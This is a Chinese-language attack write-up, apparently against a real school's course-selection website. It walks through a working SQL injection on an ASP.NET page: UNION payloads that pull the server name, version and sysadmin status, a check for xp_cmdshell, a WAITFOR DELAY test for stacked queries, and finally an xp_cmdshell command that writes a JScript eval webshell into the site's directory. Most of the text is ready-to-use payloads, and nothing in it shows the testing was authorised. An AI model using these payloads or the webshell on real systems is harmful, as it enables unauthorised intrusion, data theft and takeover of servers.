一）功能点浏览探测  

浏览学校站点，发现了这个选课系统。

![](../Images/d21d972791eddf76a6d2c0c674efc51c.png)

对这个选课系统进行sql测试。发现物理路径d:\\b\\book\\szxy\\yanjiuxingxuexiyingyuan\\kc\_show1.aspx.cs

![](../Images/1364dedf164fa45bb014e596bcfb4f7d.png)

一开始以为是报错注入，但后来发现是字符型注入/szxy/yanjiuxingxuexiyingyuan/kc\_show1.aspx?kcbh=1' and 1=1 and '1'='1

![](../Images/1e6f9a8d803542977460f663fdf2cfc0.png)

判断出是字符型注入了，下一步得判断回显行数

/szxy/yanjiuxingxuexiyingyuan/kc\_show1.aspx?kcbh=1%27%20order%20by%2011--+    (12**报错 11****正常)**

![](../Images/f7a25b6580c5236bfc16bcc5812adf54.png)

  

/szxy/yanjiuxingxuexiyingyuan/kc\_show1.aspx?kcbh=-1'union select null,1,2,3,4,5,6,7,8,null,null--+

可以看到1-8都是有回显信息的

![](../Images/18c1ac6ec2939b8b7729b0e500d98dd7.png)

二）信息收集

所以开始信息收集，sqlserver版本是多少？在什么主机？权限是什么？有没有开启xpcmdshell？

判断主机、判断数据库版本

aspx?kcbh=-1' union select null,(select @@servername),2,3,(select @@version),5,6,7,8,null,null--+  

![](../Images/cfd66e34e1ea9114ceae7302a731103f.png)

判断权限、判断是否开启xpcmdshell

  

aspx?kcbh=-1' union select null,(select IS\_SRVROLEMEMBER('sysadmin')),2,3,4,5,6,7,8,null,null--+

![](../Images/f80c659e93d6c5ea25f2f22aa23d220b.png)

aspx?kcbh=-1' union select null,(select count(\*) from master..sysobjects where xtype = 'x' and name = 'xp\_cmdshell'),2,3,4,5,6,7,8,null,null--+

![](../Images/136e1fdf56b33801b684a583c0e6ddae.png)

为什么要看任课教师的地方有没有1呢，因为如果判断是存在权限，就会返回正常，如果没有就不会存在1，例如 把sysadmin去掉sy

aspx?kcbh=-1%27%20union%20select%20null，(select%20IS\_SRVROLEMEMBER(%27sadmin%27)),2,3,4,5,6,7,8,null,null--+

![](../Images/0db3cf13fc62ab7aab53394857cf2b47.png)

所以可以判断出，具备sa权限、开启了xpcmdshell

  

三）解决问题

 

问题点在于，xpcmdshell不能执行命令？！排查下问题所在

?kcbh=-27';WAITFOR DELAY '0:0:5' --+ 页面是迟缓了5秒，证明堆叠查询是有的

 

有堆叠，有路径，有权限，直接写入webshell

.aspx?kcbh=-27';exec master..xp\_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item\["pass"\],"unsafe");%^> > d:\\b\\book\\szxy\\yanjiuxingxuexiyingyuan\\xuexi1.aspx ' ; --+

 

![](../Images/75140db2ff8320b7902bd19cb7269e05.png)
